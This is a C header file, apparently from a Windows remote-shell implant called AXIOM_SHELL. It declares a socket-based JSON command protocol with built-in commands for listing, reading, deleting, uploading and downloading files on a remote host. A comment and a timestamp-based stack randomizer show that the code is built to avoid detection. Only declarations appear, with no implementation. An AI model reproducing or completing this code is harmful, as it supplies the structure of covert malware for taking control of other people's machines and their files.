#ifndef AXIOM_SHELL_H
# define AXIOM_SHELL_H

# include <ws2tcpip.h>
//# define __DEBUG__ // Uncomment to enable debugging prints, will make it easy to detect
# define MODULER (((__TIMESTAMP__[17]) << 8 | (__TIMESTAMP__[18])) % 1024)
# define STACK_RANDOMIZER unsigned char randomizer[MODULER]; (void)randomizer;
# ifdef __DEBUG__
#  define DEBUG_LOG(...) printf(__VA_ARGS__)
# else
#  define DEBUG_LOG(...) (void)0
# endif

enum CommandType
{
	CommandBuiltin = 0,
	CommandCommand = 1
};

typedef struct _COMMAND
{
	enum CommandType commandType;
	char *binary;
	size_t argumentCount;
	char **arguments;
} COMMAND, *PCOMMAND;

typedef struct _JSON_RAW_BINARY_ARGS
{
	size_t bufferlen;
	void *buffer;
} JSON_RAW_BINARY_ARGS, *PJSON_RAW_BINARY_ARGS;

typedef struct _JSON_READY_FOR_DOWNLOAD_ARGS
{
	char *local_filepath;
	size_t filelen;
} JSON_READY_FOR_DOWNLOAD_ARGS, *PJSON_READY_FOR_DOWNLOAD_ARGS;

enum JsonPacketType
{
	JsonReadyForInput = 0,
	JsonCommandOutput = 1,
	JsonRawBinary = 2,
	JsonReadyForDownload = 3,
	JsonReadyForUpload = 4
};

typedef BOOL(*BuiltinPointer) (SOCKET sock, size_t argc, char **argv);
typedef struct _DISPATCHER
{
    const char *builtin_name;
    BuiltinPointer builtin_pointer;
} DISPATCHER, * PDISPATCHER;

void CORE_handle_command(SOCKET sock, PCOMMAND cmd);
size_t CORE_process_invoke(const char *binaryName, const char *arguments, const char **buffer);
unsigned char* NETWORK_get_next_packet(SOCKET sock, int* bytesReceived);
int NETWORK_send_packet(SOCKET sock, const char* packet_str, size_t _packet_len);
void JSON_send_packets(enum JsonPacketType packetType, SOCKET sock, void *args);
PCOMMAND JSON_parse_packet(char *raw_packet);
void JSON_free_command(PCOMMAND cmd);

BOOL BUILTIN_cd(SOCKET sock, size_t argc, char **argv);
BOOL BUILTIN_whoami(SOCKET sock, size_t argc, char **argv);
BOOL BUILTIN_rm(SOCKET sock, size_t argc, char **argv);
BOOL BUILTIN_rmdir(SOCKET sock, size_t argc, char **argv);
BOOL BUILTIN_mkdir(SOCKET sock, size_t argc, char **argv);
BOOL BUILTIN_ls(SOCKET sock, size_t argc, char **argv);
BOOL BUILTIN_download(SOCKET sock, size_t argc, char **argv);
BOOL BUILTIN_upload(SOCKET sock, size_t argc, char **argv);
BOOL BUILTIN_cat(SOCKET sock, size_t argc, char **argv);

#endif

